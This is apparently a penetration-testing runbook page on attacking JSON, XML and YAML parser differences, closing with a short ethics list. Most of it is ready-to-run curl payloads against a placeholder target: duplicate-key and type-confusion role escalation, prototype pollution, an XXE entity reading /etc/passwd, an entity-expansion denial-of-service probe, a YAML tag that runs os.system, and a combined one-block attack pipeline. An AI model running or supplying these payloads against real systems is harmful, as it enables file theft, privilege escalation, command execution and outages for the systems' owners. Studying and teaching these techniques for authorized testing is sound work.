---
title: "JSON, XML & YAML Hacking"
description: "Attack parser differences: duplicate keys, type confusion, YAML tags, XML entities, and polyglot documents."
phase: Web
order: 47
tags:
  - parsing
  - xml
  - yaml
  - json
tools:
  - jq
  - yq
  - curl
  - burp suite
updated: 2026-10-01
---

A runbook for attacking **serialization parser differences** in an authorized scope. Goal: find where your input format and the server's interpretation diverge — duplicate keys, type confusion, entity/object expansion, or a polyglot that validates as one format and executes as another.

## 1. Map the accepted formats

Determine whether the endpoint accepts JSON, XML, YAML, or several. Content type often switches the parser.

```bash
for ct in application/json application/xml text/xml application/yaml application/x-yaml; do
  echo "== $ct"
  curl -s -o /dev/null -w '%{http_code}\n' https://target/api -H "Content-Type: $ct" --data '{"a":1}'
done
```

## 2. Duplicate keys and last-wins divergence

Different parsers disagree on which duplicate wins. A validator may see `user` while the executor sees `admin`.

```bash
curl -s https://target/api/role -H 'Content-Type: application/json' \
  --data '{"role":"user","role":"admin"}'
curl -s https://target/api/role -H 'Content-Type: application/json' --data '{"role":"admin","role":"user"}'
```

## 3. Type confusion

Send a value whose type differs from what the validator expects and watch for a behavioral difference.

```bash
curl -s https://target/api/profile -H 'Content-Type: application/json' \
  --data '{"age":"1","admin":["true"],"name":{"$ne":null}}'
```

## 4. JSON parser edge cases

Probe trailing data, unicode escapes, and prototype pollution keys.

```bash
curl -s https://target/api -H 'Content-Type: application/json' --data '{"a":1}extra'
curl -s https://target/api -H 'Content-Type: application/json' --data '{"__proto__":{"isAdmin":true}}'
curl -s https://target/api -H 'Content-Type: application/json' --data '{"constructor":{"prototype":{"polluted":true}}}'
```

## 5. XML entities and expansion

If the parser resolves entities, test internal file read and expansion DoS.

```bash
cat > xxe.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
EOF
curl -s https://target/api -H 'Content-Type: application/xml' --data-binary @xxe.xml
```

For expansion, test nested entities cautiously and confirm the parser rejects DTDs.

```bash
curl -s -o /dev/null -w '%{http_code} %{time_total}\n' https://target/api \
  -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;">]><lolz>&b;</lolz>'
```

## 6. YAML loader tags

YAML tags can instantiate objects in permissive loaders. Test language-specific tags and validate with a local parser.

```bash
printf '!!python/object/apply:os.system ["id"]\n' | yq -o=json -   # see what a parser makes of it
curl -s https://target/api -H 'Content-Type: application/yaml' --data $'!!python/object/apply:os.system ["id"]'
yq eval '.' payload.yaml           # inspect structure
jq '.' <(yq -o=json payload.yaml)  # cross-format view
```

## 7. Polyglot documents

Build data valid as more than one format so a validator and executor see different meanings.

```bash
# Valid as both a JSON object and (with minor tolerance) YAML/JS
printf '{"a": 1, "b": [1,2,3]}\n' | jq . > /dev/null && echo "json ok"
printf 'a: 1\nb: [1,2,3]\n' | yq -o=json - | jq .
```

## 8. Full pipeline (one block)

```bash
TARGET=https://target/api
# format negotiation
for ct in application/json application/xml text/xml application/yaml application/x-yaml; do
  echo "== $ct"; curl -s -o /dev/null -w '%{http_code}\n' "$TARGET" -H "Content-Type: $ct" --data '{"a":1}'
done
# duplicate keys + type confusion
curl -s "$TARGET/role" -H 'Content-Type: application/json' --data '{"role":"user","role":"admin"}'
curl -s "$TARGET/profile" -H 'Content-Type: application/json' --data '{"admin":["true"],"name":{"$ne":null}}'
# JSON prototype pollution
curl -s "$TARGET" -H 'Content-Type: application/json' --data '{"__proto__":{"isAdmin":true}}'
# XXE
printf '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>' \
  | curl -s "$TARGET" -H 'Content-Type: application/xml' --data-binary @-
# YAML tags
printf '!!python/object/apply:os.system ["id"]\n' | tee payload.yaml | yq -o=json -
curl -s "$TARGET" -H 'Content-Type: application/yaml' --data-binary @payload.yaml
# polyglot check
printf 'a: 1\nb: [1,2,3]\n' | yq -o=json - | jq . >/dev/null && echo "polyglot parses"
```

## Ethics & legality

- Only test endpoints in an official scope or with written authorization.
- Cap expansion/DoS payloads; never take a shared service down.
- Record the exact bytes and the two different interpretations as evidence.
